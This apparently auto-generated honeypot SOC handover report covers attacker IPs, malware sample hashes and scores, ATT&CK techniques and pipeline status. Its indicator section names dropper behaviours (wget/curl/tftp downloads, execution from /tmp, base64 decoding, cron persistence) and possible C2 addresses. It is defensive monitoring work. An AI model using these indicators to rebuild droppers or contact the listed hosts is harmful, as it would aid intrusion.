| `34.156.201[.]169` | **2** | 2026-09-11 04:41 | 2026-09-11 04:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]179` | **2** | 2026-09-11 03:12 | 2026-09-11 03:32 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.155[.]86` | 1 | 2026-09-11 04:31 | 2026-09-11 04:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-09-11 03:45 | 2026-09-11 03:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-09-11 06:49 | 2026-09-11 06:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `173.212.223[.]184` | 1 | 2026-09-11 05:13 | 2026-09-11 05:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.56.147[.]102` | 1 | 2026-09-11 04:54 | 2026-09-11 04:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.90.12[.]122` | 1 | 2026-09-11 05:28 | 2026-09-11 05:29 | 38s | 0 | `T1592` | 🟢 LOW |
| `201.221.108[.]173` | 1 | 2026-09-11 05:19 | 2026-09-11 05:20 | 10s | 0 | `T1592` | 🟢 LOW |
| `216.244.218[.]132` | 1 | 2026-09-11 03:24 | 2026-09-11 03:24 | 10s | 0 | `T1592` | 🟢 LOW |
| `216.244.224[.]227` | 1 | 2026-09-11 06:28 | 2026-09-11 06:28 | 10s | 0 | `T1592` | 🟢 LOW |
| `217.60.255[.]130` | 1 | 2026-09-11 04:55 | 2026-09-11 04:55 | 7s | 0 | `T1592` | 🟢 LOW |
| `34.62.148[.]109` | 1 | 2026-09-11 04:40 | 2026-09-11 04:40 | 4s | 0 | `T1592` | 🟢 LOW |
| `36.41.186[.]9` | 1 | 2026-09-11 06:08 | 2026-09-11 06:08 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-09-11 04:06 | 2026-09-11 04:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]183` | 1 | 2026-09-11 05:50 | 2026-09-11 05:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.201.73[.]29` | 1 | 2026-09-11 05:33 | 2026-09-11 05:33 | 13s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]137` | 1 | 2026-09-11 03:36 | 2026-09-11 03:36 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]211` | 1 | 2026-09-11 05:23 | 2026-09-11 05:23 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-09-11 03:11 | 2026-09-11 03:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]212` | 1 | 2026-09-11 04:34 | 2026-09-11 04:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-09-11 05:58 | 2026-09-11 05:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.166.59[.]23` | 1 | 2026-09-11 06:43 | 2026-09-11 06:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.230.200[.]120` | 1 | 2026-09-11 04:46 | 2026-09-11 04:46 | 13s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]69` | 1 | 2026-09-11 03:09 | 2026-09-11 03:09 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `128.14.225[.]164` | DE | UCLOUD | **100** ⚠️ | 50 |
| `107.150.146[.]69` | US | Internap Network Services Corporation | **100** ⚠️ | 0 |
| `64.62.197[.]137` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 0 |
| `64.89.160[.]135` | LU | Ghosty Networks LLC | **100** ⚠️ | 0 |
| `207.175.13[.]248` | BE | Google LLC | **100** ⚠️ | 0 |
| `77.90.185[.]17` | LT | Limited Network LTD | **100** ⚠️ | 50 |
| `34.22.200[.]106` | BE | Google LLC | **100** ⚠️ | 1 |
| `80.94.92[.]179` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 0 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `165.1.75[.]106` | US | Oracle Corporation | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 91 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 84 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 16 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 15 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 13 |

---

## 🔕 False Positive Summary (19 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 288 cases |
| Tool 34  | Credential Extractor        | ✅ 197 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 21 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 64 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 19 filtered (6.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 30 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 84 priority case(s) shown individually · 35 recon entry/entries in table (12 group(s) consolidating 162 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-11T08:47:33Z_
